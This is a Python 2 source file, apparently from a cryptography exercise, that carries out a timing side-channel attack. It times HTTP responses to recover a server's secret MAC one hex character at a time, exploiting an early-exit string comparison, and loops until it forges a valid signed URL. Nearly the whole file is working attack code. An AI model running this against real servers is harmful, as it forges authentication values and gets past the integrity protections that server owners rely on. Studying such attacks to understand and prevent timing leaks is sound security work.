#     timing_leak.py - Functions to analyze delays in server
#     processing of MACs.
#
#     Copyright (C) 2015 Andrew J. Zimolzak <andyzimolzak@gmail.com>,
#     and licensed under GNU GPL version 3. Full notice is found in
#     the file 'LICENSE' in the same directory as this file.

import urllib2
import time

def time_url(url, N=1):
    """Time how many milliseconds between a HTTP request and a 500 error
    status. If no 500 error, then we have guessed right!
    """
    total = 0
    for i in range(N):
        start = time.time()
        try:
            dummy_response = urllib2.urlopen(url)
            # Note I am not using the "cheating" text - just throwing away.
        except urllib2.HTTPError:
            n = time.time()
            total += round(1000 * (n - start), 1)
        else:
            raise SuccessfulBreak(url)
    return total / N

class SuccessfulBreak(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return self.value

class NoIncrement(Exception):
    def __init__(self, value):
        self.value = value
    def __str__(self):
        return self.value

def next_char(urlstub, known_chars, tail, threshold, debug=False, N=1):
    """Given a base URL and 0 or more known characters of a value in the
    URL, return probable next character of that value.

    It assumes there is a timing leak due to an early-exit string
    compare on the server side. In other words, it returns the hex
    character that results in a big step-up in server response time
    when that character is appended. threshold determines how many
    milliseconds is "big." urlstub should be like
    'http://foo.com?user=bozo&secret='. known_chars should be like
    'c7a8c58f'. tail is usually one or more padding characters that
    allows the string compare to run into it and exhibit a timing
    difference. If no difference is found, though, then we might be
    done and might want to run it with no tail padding.
    """
    t0 = None
    for hc in ['0', '1', '2', '3', '4', '5', '6', '7',
               '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']:
        attempt = urlstub + known_chars + hc + tail
        t1 = time_url(attempt, N)
        if t0 == None:
            # We have no comparison so postpone.
            if debug: print t1, "....", attempt, "(p)"
            t0 = t1
        elif t1 - t0 > threshold:
            # Found.
            if debug: print t1, (t1 - t0), attempt, "*", hc
            return hc
        elif t0 - t1 > threshold and hc == '1':
            # Found after postponement (note reversed subtraction).
            if debug: print t1, (t1 - t0), attempt, "^"
            return hex(int(hc, 16) - 1)[2] 
        else:
            # Not found.
            if debug: print t1, (t1 - t0), attempt
            t0 = t1

def next_char_or_success(urlstub, known_chars, threshold, debug=False, N=1):
    """Given a base URL and known characters, return probable next
    character, and if none is found, try to guess complete correct
    URL. If indeed it guesses the correct URL, it presumably returns
    nothing and an exception gets passed upwards.
    """
    nc = next_char(urlstub, known_chars, 'z', threshold, debug, N)
    if nc:
        return nc
    else:
        pass
    # Assume that the next statement (without "tail" padding) will
    # find the correct URL and thus throw an exception.
    if debug:
        print "    ** Last time! **"
    nc = next_char(urlstub, known_chars, '', threshold)
    raise NoIncrement(urlstub + known_chars)

def find_mac_url_by_timing(base_url, T, debug=False, all_chars="", N=1):
    """Simple loop to wrap one test, and iterate til success or failure.
    """
    while(1):
        assert len(all_chars) < 50 # Sig too long! Increase T.
        try:
            all_chars += next_char_or_success(base_url, all_chars, T, debug, N)
        except SuccessfulBreak as url_result:
            return str(url_result)

